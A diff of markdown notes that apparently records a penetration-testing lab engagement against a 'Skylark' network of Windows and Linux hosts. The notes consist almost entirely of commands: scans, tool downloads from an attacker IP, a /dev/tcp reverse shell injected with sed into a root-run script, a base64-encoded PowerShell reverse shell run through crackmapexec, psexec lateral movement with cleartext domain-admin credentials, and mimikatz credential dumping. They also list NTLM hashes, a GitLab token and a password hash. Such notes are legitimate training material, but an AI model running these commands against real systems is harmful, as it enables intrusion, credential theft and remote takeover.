@@ -1,9 +1,9 @@
-```
+```bash
 nmap 192.168.240.220-227 192.168.240.250
 ```
 
 .250
-```
+```bash
 nmap 192.168.240.250
 nmap -sT -A -p 5040,49664 192.168.240.250
 sudo nmap -O 192.168.240.250 --osscan-guess
@@ -13,7 +13,7 @@ sudo nmap -sU --open -p 161 192.168.240.250
 ```
 
 .220 - (Skylark Partner Portal)
-```
+```bash
 nmap 192.168.240.220
 
 # ports open: 80,135,139,445,5900(vnc),5985,47001(winrm),49664-49670
@@ -93,7 +93,7 @@ python2 ./vncpasswd.py --decrypt BFE825DE515A335BE3 --hex
 # R3S3+rcH
 ```
 .220 privesc
-```
+```bash
 # we have SeImpersonate
 # using EFS potato we can get a root shell on 9999
 iwr -uri http://192.168.45.229/efspotato.cs -Outfile efspotato.cs
@@ -104,7 +104,7 @@ iwr -uri http://192.168.45.229/nc.exe -Outfile nc.exe
 ```
 
 .221 (austin02.SKYLARK.com)
-```
+```bash
 nmap 192.168.240.221
 nmap -sT -A -p 80,443 192.168.248.221
 sudo nmap -sU --open -p 161 192.168.248.221
@@ -144,7 +144,7 @@ iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe
 ```
 
 .221 privesc
-```
+```bash
 iwr -uri http://192.168.45.217/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
 
@@ -216,7 +216,7 @@ sudo hashcat -m 13100 backup.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
 .221 pivot -> .10 -> pivot to .111, .110
-```
+```bash
 # from kali
 sudo ip tuntap add user kali mode tun ligolo
 sudo ip link set ligolo up
@@ -254,7 +254,7 @@ impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76
 ```
 
 .10
-```
+```bash
 # 22,5901
 sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose
 vncviewer 10.10.84.10::5901
@@ -264,7 +264,7 @@ passwd2=ABCDEFGH
 ```
 
 .10 privesc
-```
+```bash
 sudo -l
 # have sudo on ss and ip
 https://gtfobins.github.io/gtfobins/ip/#sudo
@@ -272,8 +272,8 @@ sudo ip netns add foo
 sudo ip netns exec foo /bin/bash
 ```
 
-.10 -> .14 (another level of internal network)
-```
+.10 -> .14 (another level of internal network) (CICD)
+```bash
 # in research dir add shell command
 vi scratchpad/.gitlab-ci.yml
 
@@ -288,7 +288,7 @@ chmod +x agent
 ./agent -connect 192.168.194.221:11601 -ignore-cert
 
 # try this ifcant connect to 11601
-listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:11061 --tcp
+listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:11601 --tcp
 ./agent -connect 192.168.229.221:8000 -ignore-cert
 # from kali
 session
@@ -314,8 +314,8 @@ root
 glpat-PzrxBe-5Js7c3t7hoq4X
 ```
 
-.14 privesc
-```
+.14 privesc (CICD)
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # get better shell
@@ -346,10 +346,68 @@ find . -name local.txt 2>/dev/null
 cat /opt/fs_checks/fs.sh
 cat /opt/u/__fs.sh
 
+# get a root shell - workaround for not being able to do interactive terminal
+cd  /home/gitlab-runner
+cp /opt/u/__fs.sh /home/gitlab-runner
+sed -i '/EXPECTED_USERS="54"/a \/bin\/bash -l > \/dev\/tcp\/192.168.45.229\/5555 0<&1 2>&1' __fs.sh
+cat __fs.sh > /opt/u/__fs.sh
+
+# findings from root linpeas
+ "email"=>"development@skylark.com",
+ "encrypted_password"=>
+  "$2a$10$.B9bs.xb808RvTrgouKgAeMA9HQtNEU8/M6ajyWFJeAYdwEnmpADK",
+
+```
+
+with double-pivot to x.20 scan other machines
+```bash
+nmap 10.20.84.15 10.20.84.110 10.20.84.111
+
+```
+
+.15
+```bash
+# ports open: 80,445,1433(mssql)
+# we can login with domain admin creds
+crackmapexec smb 10.20.84.15 -u backup_service -p It4Server --continue-on-success
+crackmapexec smb 10.20.84.15 -u backup_service -p 'It4Server' -X "whoami"
+
+```
+
+.110
+```bash
+# ports open: 445,3389
+# since backup_service is domain admin, check to see if creds work. they do and we can login using psexec
+crackmapexec smb 10.20.84.110 -u backup_service -p It4Server --continue-on-success
+impacket-psexec backup_service:It4Server@10.20.84.110
+
+# find proof.txt, can't pass directory so need to be in C:\Users
+Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue
+
+iwr -uri http://192.168.45.229/mimikatz.exe -Outfile mimikatz.exe
+. .\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::cache 
+token::elevate
+lsadump::sam
+
+# NTLM hashes found
+k.smith
+d2a87ca4d6735870dc2357a83960c379
+
+offsec
+7f87fb27f65463aca8630598c49c6de3
+```
+
+.111
+```bash
+nmap 10.20.84.111
+crackmapexec smb 10.20.84.15 -u backup_service -p It4Server --continue-on-success
 ```
 
 .11
-```
+```bash
 crackmapexec smb 10.10.76.11 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
 
 # from backup share obtained
@@ -360,7 +418,7 @@ powershell.exe -c 'Get-ChildItem -Path C:\ -Filter local.txt -Recurse -ErrorActi
 ```
 
 .13 - mail server use for phishing
-```
+```bash
 sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
 crackmapexec smb 10.10.76.13 -u backup_service -p It4Server --continue-on-success
 crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-success
@@ -371,7 +429,7 @@ crackmapexec smb 10.10.76.13 -u backup_service -p 'It4Server' -X "powershell.exe
 ```
 
 .222
-```
+```bash
 nmap 192.168.213.222
 sudo nmap -sU --open -p 161 192.168.213.222
 
@@ -388,7 +446,7 @@ impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@192.168.
 ```
 
 .223 (milan) (standalone)
-```
+```bash
 nmap 192.168.213.223
 sudo nmap -sU --open -p 161 192.168.213.223
 
@@ -425,7 +483,7 @@ nc -nvlp 443
 ```
 
 .223 privesc
-```
+```bash
 wget http://192.168.45.160/linpeas.sh -O linpeas.sh
 
 # findings
